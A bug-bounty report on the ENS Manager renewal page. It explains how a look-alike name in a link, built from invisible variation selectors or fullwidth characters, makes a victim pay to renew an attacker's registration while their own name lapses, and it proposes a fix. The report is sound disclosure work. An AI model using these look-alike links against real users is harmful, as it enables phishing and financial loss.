# 93115 w a critical manager renew route the victim pays to renew an attacker s name and their own lapses

**Submitted on Sep 14th 2026 at 09:55:50 UTC by @ChaseTheLight for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #93115
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/manager>
* **Impacts:**
  * Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as: - resolving or rendering an ENS name to an attacker-controlled address - showing the wrong recipient or amount on a transaction the user then approves

## Description

## Brief/Intro

The Manager's renewal page derives two names from one URL segment. `parseRenewableName` lowercases the segment, and its label becomes the page heading, the price quote and the label inside the `renew` calldata. Every owner, protocol and expiry read on the same page goes through ENSIP-15 `normalize` first.

ENSIP-15 maps characters that lowercasing leaves alone, the emoji variation selector U+FE0F among them. `/renew/🔥️🔥️🔥️.eth` carries a U+FE0F after each flame; the selector has no glyph, and U+1F525 already has emoji presentation, so nothing changes on screen. That segment renders the page of `🔥🔥🔥.eth`: that name's expiry, that name's renewal eligibility, a heading that reads the same, and a Renew button whose transaction carries the label `🔥️🔥️🔥️`, a separate registration that an attacker holds. The victim signs `renew("🔥️🔥️🔥️", duration, token, referrer)`. The page then reports the name as extended to its old expiry plus the chosen duration; the attacker's registration is what gained the time, and the victim's name expires on its original date.

Everything on the path to that transaction is in the listed assets: the route, both canonicalisers, the page components and the calldata encoder live in `apps/manager` and `packages/transaction-manager`. Two offline test files, written against the frozen snapshot and executed in a sealed network namespace, drive both loaders and the page's renewal machine to the wallet boundary and measure what each read was asked for, what the page shows and which label the calldata carries (Proof of Concept section).

## Vulnerability Details

### Root cause

One route parameter, two canonical forms, consumed by different halves of the same page.

The write side is `parseRenewableName` (`apps/manager/src/features/renew/utils/renewableName.ts:25-36`). It wraps `parseName` (`apps/manager/src/features/register-v2/utils/name-parser.ts:33-82`), whose only character-level transform is `name.trim().toLowerCase()` (`:46`), followed by an ASCII punctuation blacklist (`:11`); `:58` additionally drops empty labels, so a leading or trailing dot is removed. Both loaders return that label to the page unchanged: `apps/manager/src/routes/renew/$name.tsx:60-63` and `apps/manager/src/routes/renew-v1/$name.tsx:50-53`.

The read side starts one line later in the same loader. `profileExpiryQuery(name)` (`renew/$name.tsx:26-28`) calls `getExpiry`, whose first statement is `normalizeEth2LdName(name)` (`apps/manager/src/features/profile/service/profileExpiry.ts:77`); that is viem's ENSIP-15 `normalize` (`profileName.ts:1,18`). The canonical name, `ethName.name`, is what the owner read and the v2 expiry read receive (`profileExpiry.ts:88,105-106`; `profileOwner.ts:55-58`). So the loader's `protocol` and `currentExpiry` describe the canonical name, while its `label` is the lowercased segment.

Measured with viem 2.52.2, the version the Manager resolves, on each side's own function:

| Route segment                                 | `parseName` label (renewed) | `normalize` name (read) | `labelhash` of the two labels       |
| --------------------------------------------- | --------------------------- | ----------------------- | ----------------------------------- |
| `🔥️🔥️🔥️.eth` (U+1F525 U+FE0F, three times) | `🔥️🔥️🔥️` (unchanged)     | `🔥🔥🔥.eth`            | `0x0723b895...` and `0x4fcdcd9b...` |
| `ｖｉｔａｌｉｋ.eth` (fullwidth)                     | `ｖｉｔａｌｉｋ`                   | `vitalik.eth`           | differ                              |
| `𝐯𝐢𝐭𝐚𝐥𝐢𝐤.eth` (mathematical bold)      | `𝐯𝐢𝐭𝐚𝐥𝐢𝐤`            | `vitalik.eth`           | differ                              |
| `ⓥitalik.eth` (circled)                       | `ⓥitalik`                   | `vitalik.eth`           | differ                              |
| `café.eth` (e followed by U+0301)             | `café` (unchanged)          | `café.eth` (U+00E9)     | differ                              |
| `VITALIK.eth`                                 | `vitalik`                   | `vitalik.eth`           | same                                |

The last row is the one the app tests. `renewableName.test.ts:23-27` asserts that `canRenewV2Name('Alice.eth')` and `canRenewV2Name('Alice.ETH')` are accepted, and case is the one transform both sides agree on. No test under `features/renew` or `routes` exercises any other row.

Two label strings are two registrations for either renewer the app targets, because both key `renew` on the hash of the label bytes. Neither renewer the app targets is in the audited repository. In the project's contracts repository the v2 registrar inherits its `renew` from `AbstractETHRegistrar` (`contracts/src/registrar/ETHRegistrar.sol:37`, `contract ETHRegistrar is AbstractETHRegistrar, IETHRegistrar`; the file overrides neither `renew` nor `_requireRenewable`), and that `renew` resolves the registration as `ETH_REGISTRY.getState(LibLabel.id(label))` and renews `state.tokenId`, where `LibLabel.id` is `uint256(keccak256(bytes(label)))` (`ensdomains/contracts-v2`, `contracts/src/registrar/AbstractETHRegistrar.sol:84-94,131-139` and `contracts/src/utils/LibLabel.sol:6-9`, branch `main` as fetched on 2026-09-12; reference 13). `ETHRenewerV1`, the renewer the app targets for unmigrated v1 names (`apps/manager/src/features/renew/utils/renewalProtocol.ts:5-8`, reached from `apps/manager/src/features/renew/state/renewalUi.machine.ts:189`), is keyed the same way and in the same repository: it is `contract ETHRenewerV1 is AbstractETHRegistrar` (`contracts/src/registrar/ETHRenewerV1.sol:35`), it overrides neither `renew` nor `_requireRenewable`, and the renewal callback it overrides syncs ENSv1 as `BASE_REGISTRAR.renew(LibLabel.id(label), duration)` (`:133-135`). The registry expiry lookup the app itself performs hashes `labels[0]` as given (ensjs `src/actions/public/v2/getExpiry.ts:54`, `labelhash(labels[0])`; a pinned dependency rather than part of the export). The calldata therefore names a registration whose owner and expiry the page never read.

Nothing between the two sides compares them. `canRenewV2Name` (`renewableName.ts:40-47`) rebuilds `${parsed.value.label}.eth` from the raw label, and `isRenewableV2EthName` (`apps/manager/src/features/grace/utils/gracePeriod.ts:41-55`) tests it against `/^[^.]+\.eth$/` (`:48`) and tests the grace window against the canonical name's expiry. Every mapped form in the table passes the regex. Neither route defines `params.parse`; the only parse on a name route in the app checks the segment's length and that it contains a dot (`apps/manager/src/routes/$name/route.tsx:5-8`), and no route redirects a segment to its canonical form.

### What the page shows and what it signs

Every consumer of the loader's `label` takes it without canonicalising it:

* The heading. `RenewPricingStep` passes `label` to `PricingDomainHeader` (`apps/manager/src/features/renew/workflow/pricing/PricingStep.tsx:24,27`), which renders `${label}.eth` as the `<h1>` (`apps/manager/src/features/register-v2/workflow/pricing/components/PricingDomainHeader.tsx:9,29`).
* The price. `ConfirmPurchase.tsx:21-22` queries `getRenewPriceQueryOptions(label, duration, selectedToken, protocol)`; `getRenewPrice` (`apps/manager/src/features/renew/data/queries/renewPricing.query.ts:36-42`) hands `label` to ensjs `getRenewPrice`, a `readContract` of `getRenewPrice(label, duration, paymentToken)` on the renewer (`src/actions/public/v2/getRenewPrice.ts:57-66`). The number on screen is the price of the twin.
* The transaction. `ConfirmPurchase.tsx:63-72` sends `renewal.start` with `label`; the renewal machine stores it as `submissionData.label` (`apps/manager/src/features/renew/state/renewalUi.machine.ts:148-159`) and hands it to `submitRenewActor` (`:346-355`); `encodeRenewData` (`packages/transaction-manager/src/machines/registration/registration.actors.ts:1020-1031`) removes the first `.eth` from the label (`:1025`) and ABI-encodes `renew(label, duration, paymentToken, referrer)`. That file contains no call to `normalize` or `labelhash`; its `toLowerCase` calls are on payment-token addresses (`:844,:910,:1064`).
* The receipt. After the transaction, `RenewalDetails.tsx:50` renders `${submissionData.label}.eth` on the domain card, and `:28-31` computes the "Expires" line from `currentExpiry`, the canonical name's expiry, plus the chosen duration (`:108`). One card, two names, presented as one.

Renewal is a direct wallet flow: "the connected EOA approves + renews itself" (`ConfirmPurchase.tsx:32-34`), so the wallet is asked to sign an ERC-20 approval, when the allowance is short, and a `renew(string,uint64,address,bytes32)` call whose string argument differs from the name on screen by a selector with no glyph.

### Trigger and preconditions

The actor is the owner of `X.eth`, following a link to the renewal page and completing the ordinary renew flow: pick a duration, confirm, sign. The attacker holds a twin label `X'` that lowercases to itself and normalises to `X`.

For the v2 route, the twin is an ordinary registration, and the Manager's own registration route carries such a label to the registrar unchanged: `/register/$name` takes `parseName`'s label (`apps/manager/src/routes/register/$name.tsx:24,57`); its availability query applies `normalizeDomainNameFromUrl`, which only strips or appends `.eth` and truncates to 255 bytes (`apps/manager/src/utils/domain.ts:27-33`); `checkRealNameAvailability` runs `validateENSName` (`apps/manager/src/features/shared/service/nameChainContractService.ts:31`), which rejects spaces, dots inside the label, labels under three code points and the same ASCII blacklist, and nothing else (`apps/manager/src/features/shared/registration/nameUtils.ts:100-140`); and the registration encoder in `registration.actors.ts` applies no normalisation to the label (the same absence of `normalize` and `labelhash` noted above). The project states the contract-side rule in its own source: "the ENSv2 contracts impose no character constraints on labels (only a 1–255 byte length), so the actual client-side rule is ENSIP-15 normalization" (`apps/portal/src/utils/token/isNameOrAddress.ts:9-10`); the v2 registrar's ABI also carries a `NotValid(label)` error bubbled from its rent price oracle (`@ensdomains/ensjs-abi` `src/v2/ethRegistrar.ts:95-99`, `src/v2/standardRentPriceOracle.ts:9-15`), the contract that package describes as the one "used by `ETHRegistrar` and `ETHRenewerV1`" (`src/v2/standardRentPriceOracle.ts:4`). That predicate is not in the audited repository, but it is published as verified source at the oracle address the app pins for this chain, `0x8914b662...` (ensjs `src/clients/l1.ts:198-199`): `isValid(label)` is `getBasePrice(label, 1) > 0`, `getBasePrice` rejects a label on its byte length alone, zero or above 255, and otherwise returns a rate from a table indexed by code point count, and `isValid` carries the docstring "Does not check if normalized." (reference 14). The same check gates registration and renewal, because `getRegisterPrice` and `getRenewPrice` both route through it and revert `NotValid` only where that base price is zero. What the source does not fix is the rate table's values, which are supplied to the oracle's constructor and were not read from the deployment here. Which oracle a registrar reads is set at construction and replaceable after it: both deployed renewers were constructed with this oracle address (reference 15), and each one's owner can replace it. Whatever the registrar admits, the Manager registers.

On the v2 route the twin must be renewable when the victim arrives, meaning registered or within its grace period (`ETHRegistrar.sol:264-272`). That is the attacker's own registration state.

The route for unmigrated v1 names splits the same way, on a different precondition. `renew-v1/$name.tsx:15,51` takes the same lowercased label; `:21` and `:36` read the owner and the v1 expiry on the canonical name; `:37` gates the page on `ETHRenewerV1.isRenewable(label)` for the raw label (`apps/manager/src/features/renew/data/queries/v1Renewable.query.ts:19,28`). So this page too is gated on the twin and titled with the victim's expiry. What differs is which twin reaches it. `ETHRenewerV1` renews only a name the v2 registry holds as `RESERVED`, or one that is `AVAILABLE` with a null owner still inside the v2 grace period (`contracts/src/registrar/ETHRenewerV1.sol:138-148`), a contract whose own summary line is that it "only renews premigrated ENSv2 reservations" (`:28`). `RESERVED` is the registry's state for a label registered with no owner, and entering it requires a root role either way: `ROLE_REGISTRAR` on root to register a label with a null owner, and `ROLE_RENEW` on root to revive a lapsed reservation (`contracts/src/registry/PermissionedRegistry.sol:49-51,212-213,218-224,407-409,430,598-608`). `ETHRenewerV1`'s second branch requires the same null owner, which is what the v2 registrar's grace branch forbids: that one requires `latestOwner != address(0)` (`ETHRegistrar.sol:274-281`). An ordinary registration that has expired is therefore renewable on the v2 route while it is in grace, and not on this one. The twin described above, registered through the Manager's own route, is `REGISTERED` with an owner, which is what the v2 registrar renews (`ETHRegistrar.sol:264-272`) and what `ETHRenewerV1` does not. A twin on this route is therefore a label the registry holds as `RESERVED`, or one that is `AVAILABLE` with a null latest owner inside the v2 grace period, rather than an ordinary registration made through the app. This report does not establish that an attacker can hold such a twin; it files on the v2 route, where the twin is the attacker's own registration. The PoC drives both loaders; it answers renewability from a lookup table, so it measures the split and not the precondition.

The victim can also arrive from inside the app. The profile page's Renew Name button links `getRenewalRoute(protocol)` with the raw route `name` (`apps/manager/src/features/profile/components/view/ProfileRenewAction.tsx:81-87`). The one production call site of `shouldShowThirdPartyRenewalWarning` is on that button (`:66`; `apps/manager/src/features/renew/utils/thirdPartyRenewalWarning.ts:1-3`), and it is fed `isOwner` computed from the owner of the canonical name (`ProfileView.tsx:99-101,119`, passed as `resolvedIsOwner` at `:152,230` and forwarded unchanged by `ProfileActions.tsx:99-104`), so for the victim it is silent.

The same split is reached without an attacker. An emoji keyboard that emits U+FE0F produces a segment whose owner and expiry reads go to one name and whose price query and calldata carry another.

### Recommended fix

One canonical form. Derive the label in `parseRenewableName` from `normalizeEth2LdName` and reject a segment that ENSIP-15 cannot normalise; the label the page prices, displays and encodes is then the label whose expiry it read. The patch and its effect on the tests are in the Proof of Concept section.

## Impact Details

### The in-scope impact this maps to

The entry this report is filed on, quoted in full from the Impacts in Scope list:

> Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as: - resolving or rendering an ENS name to an attacker-controlled address - showing the wrong recipient or amount on a transaction the user then approves

The severity claimed is **Critical**, the severity of that entry. The incorrect item the page displays is the name: the heading and the receipt card read as the victim's name, next to that name's expiry, eligibility and post-renewal expiry. The transaction detail is the `label` argument, pre-filled with a different registration's label; the user approves it. The funds go to the registrar either way; what the victim did not intend is the registration the payment extends, the attacker's, and the amount is that registration's price.

A second entry on the same list reaches this finding and carries the same severity:

> Malicious interactions with an already-connected wallet, such as: Modifying transaction arguments or parameters Substituting contract addresses Submitting malicious transactions Signing or submitting a transaction against the wrong chain (for example when the request's target chain is not validated) Inducing a blanket token approval (for example setApprovalForAll on the registry or NameWrapper) to an attacker-controlled address

The renewal flow requires a connected wallet, and the first item describes what happens to the `label` argument. Its head clause can be read as requiring an attacker at the wallet boundary; here the attacker supplies a link and the application supplies the argument.

### Loss mechanism and its bound

The victim's wallet pays the renewal price of the twin for the chosen duration, in the payment token the page offers (USDC on the v2 registrar, `packages/transaction-manager/src/contracts/ens-sepolia.ts:44-54`). The payment is a mined, user-signed transaction against a registrar; the renewer ABI the encoder uses, `ethRegistrarRenewSnippet`, has `renew` as its only function entry (`@ensdomains/ensjs-abi` `src/v2/ethRegistrar.ts:291-303`). The duration lands on the attacker's registration.

The collateral loss is the victim's own name. The page's "Expires" line reports it extended, so the victim has no reason to renew it again. It expires on its original date and, after the 28-day v2 grace period (`gracePeriod.ts:6`), becomes available to anyone, the attacker included.

The bound per victim is one renewal price plus the name. The link is reusable across victims and across every name for which a twin can be registered. For the U+FE0F example the twin is six code points against the canonical three, so the quote on screen is whatever the registrar charges for a six-character label; a figure lower than the victim expects is not a warning to them. For the fullwidth, mathematical and circled forms the code-point count is unchanged.

### Lower entries, and the exclusions that could apply

No lower entry on the list covers a signed, paid transaction whose displayed subject is a different registration from the one it renews. No High, Medium or Low entry describes a transaction the user signs: they cover persistent and reflected static-content injection, disclosure of or changes to other users' details, open redirect, expired outgoing links, and temporary denial of access.

**"The ENS smart contracts, subgraph/indexer, and NFT metadata service are out of scope"** is the entry to weigh first, because the transaction lands on a registrar. The entry this report files on locates the harm at "a transaction the user then approves", and that transaction is built, argument by argument, inside the listed `packages/transaction-manager` from a label produced inside the listed `apps/manager`. The registrar executes the calldata it is handed, as it does for every renewal; no contract misbehaves and none is claimed to. The loader's reads on this path are two contract reads: the owner read, which returns on the nonzero v2 owner before any other lookup (`profileOwner.ts:60-65`), and the registry expiry read (`profileExpiry.ts:104-110`). The entry's own first sub-bullet, resolving a name to an attacker-controlled address, presupposes the same kind of landing.

**"Impacts caused by vulnerabilities requiring un-prompted, in-app user actions that are not part of the normal app workflows"** does not apply. The victim follows a link to the renewal page and completes the renewal workflow as designed: duration, confirm, sign.

**"UX and UI impacts that do not materially disrupt use of the platform"** does not apply. The defect site is a route loader and a React page, but the outcome is a user-signed on-chain payment for another party's registration and the lapse of the victim's own name while the app reports it renewed.

**"Attempting phishing or other social engineering attacks against our employees and/or customers"** is a testing prohibition. This report describes a link and sent none; the Proof of Concept section runs against local source only.

The victim opens an attacker-supplied link. The entry's first sub-bullet is a victim resolving a name and receiving an attacker's address; a link to the app's own renewal page for what reads as the victim's own name is the same shape of interaction. Once the victim is on that URL the app keeps it: the profile page's Renew Name button links the raw segment (Trigger and preconditions).

### Not a duplicate, and scope

The nearest entry in the Known Issues document is **EXP-INPUT-005**, quoted in full:

> EXP-INPUT-005: ENS name validators accept deceptive characters
>
> Severity: Medium · Status: open, fix ready (Manager and Explorer)
>
> Our name validators accept inputs that ENS normalization later rejects or transforms, including homoglyphs, bidirectional-control and other control characters, and a single leading or trailing dot. The practical impact is homograph-style display confusion in our UI rather than incorrect resolution.

The label reaches the route through `parseName`, whose permissiveness is that entry's subject; the admission is necessary and not sufficient. The defect this report describes is downstream of it: the same route reads owner, protocol and expiry on the ENSIP-15 form and prices, displays and encodes the lowercased form, so the page vouches for one registration and signs for another. The entry describes neither the split nor its consequence. It bounds its own consequence to display confusion "rather than incorrect resolution". The heading does show the deceptive string, and on its own that is the display confusion the entry describes. What the entry does not describe is that the same page reads the owner and expiry of the canonical name, so the eligibility gate passes on the victim's registration, the "Expires" line is the victim's, and the wallet is asked to sign `renew` for a label whose hash is not the victim's. That consequence is a signed, paid renewal of another registration, on a Critical entry, against the entry's Medium. Whether the entry's ready validator fix also closes this route does not bear on the carve-out, which turns on consequence and severity. The document's own rule keeps it eligible:

> new consequences of a listed root cause that materially change its severity

The document draws the same line elsewhere. QA-03, a price-rounding mismatch in the Explorer, is bounded with "Display-level only; a mismatch between the displayed total and the amount actually charged on-chain would be a new finding"; the mismatch here is between the name the page reads about and the label the signed transaction carries.

Nothing else in the document touches the renewal label. **WEB-1255** is a grace-window boolean defaulting to v2, so v1 names are shown the wrong expiry status; here the expiry shown is correct for the canonical name and belongs to a different registration from the one renewed. **WEB-626** is a modal on the owner's own grace-period renewal that implies a third-party renewal; the inverse symptom on another path. **QA-03** is the price-rounding entry quoted above. **QA-05** blocks renewal right after registration and is unrelated.

The defect is in `apps/manager` and `packages/transaction-manager`, both listed assets. There is no feature flag and no branch that avoids it: the two canonicalisers are called unconditionally on every load of either renew route.

## References

Repository: `https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready` (the Manager app asset at `apps/manager`, dated 6 August 2026; the Transaction-manager asset at `packages/transaction-manager`, dated 13 August 2026). All paths below are relative to the repository root, except references 13 and 14, which name their own sources.

1. `apps/manager/src/routes/renew/$name.tsx` - `#L20` (`parseRenewableName(name)`), `#L26-L28` (`profileExpiryQuery(name)`), `#L52` (`canRenewV2Name(name, expiryDate)`), `#L60-L63` (the loader returns the lowercased label next to the canonical name's expiry)
2. `apps/manager/src/routes/renew-v1/$name.tsx` - `#L15`, `#L21`, `#L35-L38`, `#L50-L53` (the same shape, gated on `isRenewable` for the raw label), `#L62` (`protocol="v1"`)
3. `apps/manager/src/features/renew/utils/renewableName.ts` - `#L25-L36` (`parseRenewableName`, the defect site and the fix site), `#L40-L47` (`canRenewV2Name`)
4. `apps/manager/src/features/register-v2/utils/name-parser.ts` - `#L11` (the ASCII blacklist), `#L46` (`trim().toLowerCase()`, the only transform)
5. `apps/manager/src/features/profile/service/profileExpiry.ts` - `#L77` (`normalizeEth2LdName(name)`), `#L88` (owner read on the canonical name), `#L104-L110` (v2 expiry read on the canonical name); `apps/manager/src/features/profile/service/profileName.ts` - `#L1`, `#L18` (viem `normalize`), `#L62-L73`; `apps/manager/src/features/profile/service/profileOwner.ts` - `#L25`, `#L55-L65`
6. `apps/manager/src/features/grace/utils/gracePeriod.ts` - `#L6` (the 28-day v2 grace period), `#L41-L55` (`isRenewableV2EthName`, regex at `#L48`); `apps/manager/src/routes/$name/route.tsx` - `#L5-L8` (the only `params.parse` on a name route)
7. `apps/manager/src/features/renew/workflow/pricing/PricingStep.tsx` - `#L24`, `#L27`; `apps/manager/src/features/register-v2/workflow/pricing/components/PricingDomainHeader.tsx` - `#L9`, `#L29` (the heading); `apps/manager/src/features/renew/workflow/pricing/components/ConfirmPurchase.tsx` - `#L21-L22` (price query on the raw label), `#L32-L34` (direct wallet route), `#L63-L72` (`renewal.start` with the raw label); `apps/manager/src/features/renew/data/queries/renewPricing.query.ts` - `#L36-L42`
8. `apps/manager/src/features/renew/state/renewalUi.machine.ts` - `#L148-L159` (stores the label), `#L189` (`renewerAddress: getRenewerAddress(input.protocol)`), `#L346-L355` (hands the label and that address to `submitRenewActor`); `apps/manager/src/features/renew/utils/renewalProtocol.ts` - `#L5-L8` (`ETHRenewerV1` for `'v1'`, `ETHRegistrar` for `'v2'`); `apps/manager/src/features/renew/workflow/renewing/components/RenewalDetails.tsx` - `#L28-L31` (the "Expires" date from the canonical name's expiry), `#L50` (the card from the raw label), `#L108`
9. `packages/transaction-manager/src/machines/registration/registration.actors.ts` - `#L1020-L1031` (`encodeRenewData`, no canonicalisation), `#L1039-L1100` (`submitRenewActor`; `#L1048-L1053` the renewer default, which the renewal machine overrides at `apps/manager/src/features/renew/state/renewalUi.machine.ts` `#L354`); `packages/transaction-manager/src/contracts/ens-sepolia.ts` - `#L10`, `#L17` (the two renewers), `#L44-L54` (USDC)
10. The registration path that carries the twin to the registrar: `apps/manager/src/routes/register/$name.tsx` - `#L24`, `#L57`; `apps/manager/src/features/register-v2/data/queries/availability.query.ts` - `#L9`; `apps/manager/src/utils/domain.ts` - `#L27-L33`; `apps/manager/src/features/shared/service/nameChainContractService.ts` - `#L31`; `apps/manager/src/features/shared/registration/nameUtils.ts` - `#L132`; the project's statement of the contract-side rule, `apps/portal/src/utils/token/isNameOrAddress.ts` - `#L9-L10`
11. The in-app routes to the page: `apps/manager/src/features/profile/components/view/ProfileRenewAction.tsx` - `#L66`, `#L81-L87`; `apps/manager/src/features/renew/utils/thirdPartyRenewalWarning.ts` - `#L1-L3`; `apps/manager/src/features/profile/components/view/ProfileView.tsx` - `#L99-L101`, `#L119`, `#L152`, `#L230`; `apps/manager/src/features/profile/components/view/ProfileActions.tsx` - `#L45-L50`, `#L99-L104`
12. The app's own test of the eligibility check: `apps/manager/src/features/renew/utils/renewableName.test.ts` - `#L23-L27`
13. The renewers' `renew`, outside the audited repository: `ensdomains/contracts-v2` at commit `48b3e2d39513b9dd32ef1850877a29009bc807b9`. The first three files below were fetched from branch `main` on 2026-09-12 and re-fetched at that commit for comparison; all three are byte-identical, which is what pins them. `contracts/src/registrar/AbstractETHRegistrar.sol` (sha256 `4ac0320c1430a837cdd73a120c17ac7934e5ccc0d9c371e6914531bf8abe03ac`, 5,613 bytes, 144 lines) - `#L84-L94` (`renew`; `_requireRenewable(label, duration)` at `#L87`, `ETH_REGISTRY.renew(state.tokenId, newExpiry)` at `#L91`), `#L131-L139` (`_requireRenewable`; `ETH_REGISTRY.getState(LibLabel.id(label))` at `#L136`), `#L78-L80` (`setRentPriceOracle`, owner-replaceable); `contracts/src/registrar/ETHRegistrar.sol` (sha256 `c945829de90eeb338a07a20e7a3cbb367f36a12795f3fd80cb8aaba6abeac472`, 11,393 bytes, 303 lines) - `#L37` (`contract ETHRegistrar is AbstractETHRegistrar, IETHRegistrar`; the file overrides neither `renew` nor `_requireRenewable`), `#L264-L272` (`_isRenewable`: `REGISTERED`, or in grace having been registered), `#L274-L281` (`_isRenewableGrace`, which requires `latestOwner != address(0)`); `contracts/src/utils/LibLabel.sol` (sha256 `c4c6f7747818e60cbfef535146ba4e95731574d740a5191cf349db0d8eb7aa1a`, 688 bytes, 18 lines) - `#L6-L9` (`id`, `uint256(keccak256(bytes(label)))`); `contracts/src/registrar/ETHRenewerV1.sol`, fetched at that commit (sha256 `761d6dfe56921591ca383ee8ef02220b7cebb694dfbf61573d7670b132ed2054`, 6,191 bytes, 150 lines) - `#L28` ("only renews premigrated ENSv2 reservations"), `#L35` (`contract ETHRenewerV1 is AbstractETHRegistrar`), `#L133-L135` (`_onRenew`, `BASE_REGISTRAR.renew(LibLabel.id(label), duration)`), `#L138-L148` (`_isRenewable`: `RESERVED`, or `AVAILABLE` with a null owner inside the v2 grace period); `contracts/src/registry/PermissionedRegistry.sol`, fetched from branch `main` on 2026-09-12 and re-fetched at that commit on 2026-09-14, byte-identical (sha256 `7746ab3ac2cdfc9adb273f3a120456a65f424a474ca59b773a560f521855e599`, 25,462 bytes, 660 lines) - `#L49-L51` (the status transition diagram), `#L212-L213` and `#L218-L224` (`renew`, and its own statement of the roles each status needs), `#L407-L409` with `#L430`, and `#L598-L608` (`_canRevive`) (`RESERVED` is a registration with a null owner; entering it requires a root role in either case, `ROLE_REGISTRAR` on root to register with a null owner and `ROLE_RENEW` on root to revive a lapsed reservation, and leaving it for `REGISTERED` requires `ROLE_REGISTER_RESERVED` on root). Source in that repository. The verified source published for the two deployed addresses is reference 15; no bytecode was rebuilt or compared at either
14. The rent price oracle's validity predicate, outside the audited repository: the verified source published at `0x8914b66260EB8C4fff795650c3AE8Cd335958987` on Sepolia, the address `ensStandardRentPriceOracle` is pinned to in ensjs `src/clients/l1.ts:198-199`, as fetched on 2026-09-12 (compiler `v0.8.27+commit.40a35a09`, source path `project/src/registrar/StandardRentPriceOracle.sol`; sha256 `28e7ce98b401f9e9f1cdc8a138390f0e5494192440b81855f9ac7ebbea6f3a4b`, 16,915 bytes, 426 lines, byte-identical to the same file on the branch in reference 13) - `#L272-L277` (the docstring "Does not check if normalized." and `isValid`, `getBasePrice(label, 1) > 0`), `#L365-L374` (`getBasePrice`; `n == 0 || n > 255` returns zero at `#L366-L368`, the rate table at `#L373`), `#L399-L409` (`_requireBasePrice`, which reverts `NotValid(label)` where that price is zero), `#L300-L317` and `#L321-L331` (`getRegisterPrice` and `getRenewPrice`, both routed through it), `#L78-L80` of `AbstractETHRegistrar.sol` in reference 13 (`setRentPriceOracle`, owner-replaceable)
15. The verified source published for the two deployed addresses, read 2026-09-14 from Blockscout's Sepolia contract API (`eth-sepolia.blockscout.com/api/v2/smart-contracts/<address>`): `0xa88553F454b77203B0D036A05c894d555EAAa2Cc` (`ensEthRegistrar`, ensjs `src/clients/l1.ts:183-184`), verified 2026-08-09, and `0x4ad56feb5Fc7B8298db06E88fd5CBc41D64602Fa` (`ensEthRenewerV1`, same file `:186-187`), verified 2026-08-10. Both fully verified, neither a proxy, neither verified through a bytecode twin, both compiled with `0.8.27+commit.40a35a09`. `ETHRegistrar.sol`, `AbstractETHRegistrar.sol` and `LibLabel.sol` are byte-identical to the copies in reference 13; `ETHRenewerV1.sol` differs only in three comment lines, with every non-comment line identical. Both records carry the same decoded constructor arguments for the two parameters this report turns on: `ethRegistry` is `0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2`, the address ensjs pins as `ensRegistry` (`src/clients/l1.ts:177-178`), and `oracle` is `0x8914b66260EB8C4fff795650c3AE8Cd335958987`, the address of reference 14; `AbstractETHRegistrar.sol` in reference 13 assigns the first to `ETH_REGISTRY` and the second to `rentPriceOracle` in its constructor, `#L52-L65`, at `#L60` and `#L63`. Those are construction-time values, and `setRentPriceOracle` at `#L78-L80` can replace the oracle afterwards. The verified source published at that registry address, read 2026-09-12 from the same API and verified there 2026-08-09, is byte-identical to the `PermissionedRegistry.sol` of reference 13. Line anchors in reference 13 are given against the repository copies. For the byte-identical files named above they resolve unchanged in the published copies; `ETHRenewerV1.sol`'s sit one line later than in the published copy, where a duplicated documentation line appears once instead of twice. An explorer's verification record at a point in time, not an execution

File fingerprints at the audited snapshot:

| File                                                                              | Bytes  | Lines | sha256                                                             |
| --------------------------------------------------------------------------------- | ------ | ----- | ------------------------------------------------------------------ |
| `apps/manager/src/routes/renew/$name.tsx`                                         | 2,139  | 79    | `ab4fa2c50b3fe04cc1ad0b34d4e1e6576ae99be816d1adbbbc5cc200d107bba2` |
| `apps/manager/src/routes/renew-v1/$name.tsx`                                      | 2,148  | 69    | `7161d0a4805864a1b5b7b964eda5fd287b6fb8bad0b9be955a81991a61e239b1` |
| `apps/manager/src/features/renew/utils/renewableName.ts`                          | 1,975  | 62    | `d092a069f14de7ea0e8df49ef2b8d51b7bdecdef5aa5e8c70a76567bb4e00f6d` |
| `apps/manager/src/features/register-v2/utils/name-parser.ts`                      | 2,206  | 93    | `8c4c751a88c960e6e13ca963051fb68388501d229c194132de0b01ff55d53a43` |
| `apps/manager/src/features/profile/service/profileExpiry.ts`                      | 3,840  | 131   | `d39f34e41d3a6eb6b84147fd8ccb5677ef6414bbba234cc5292ecf89d0bb0c5b` |
| `apps/manager/src/features/profile/service/profileName.ts`                        | 1,431  | 73    | `6649ead5955265a6904a72c0c3b32aa05b3c69aead0f741bdf3d89ca964f1838` |
| `apps/manager/src/features/renew/workflow/renewing/components/RenewalDetails.tsx` | 4,648  | 128   | `56f39e0d20515d753d11a0294245354f16c317116011ab5fd0e775de5b4dae8c` |
| `packages/transaction-manager/src/machines/registration/registration.actors.ts`   | 34,392 | 1,100 | `19e52b500fd4efa73048ce8ca974af92f5c3cf8a4e881c09095a21c5189a70ea` |

## Link to Proof of Concept

<https://gist.github.com/ChaseTheLight01/54c0ede77a6f5f09aa2e9faaafd76e90>

## Proof of Concept

## Proof of Concept

Two test files, run offline against the frozen source, and the fix patch. Both files were executed on 2026-09-14, unpatched and then patched, on Node 22.18.0 and vitest 4.1.5 with happy-dom (the Manager's own test environment, `apps/manager/vitest.config.ts`), inside a sealed network namespace; the captured output is in the last section.

| File                                                      | Enters at                                                                                                                                                      | Measures                                                                                                                                                                                                                                                     | Result                                                                                                                                |
| --------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------- |
| 1. `renew_route_two_canonical_forms.poc.test.ts`          | the two canonicalisers, then the real `/renew/$name` and `/renew-v1/$name` loaders                                                                             | which name each chain read was asked for, and which label and expiry each loader hands the page                                                                                                                                                              | 6 tests; observed 5 passed, 1 failed on the frozen snapshot, the failure being the counterfactual; with the patch, 3 passed, 3 failed |
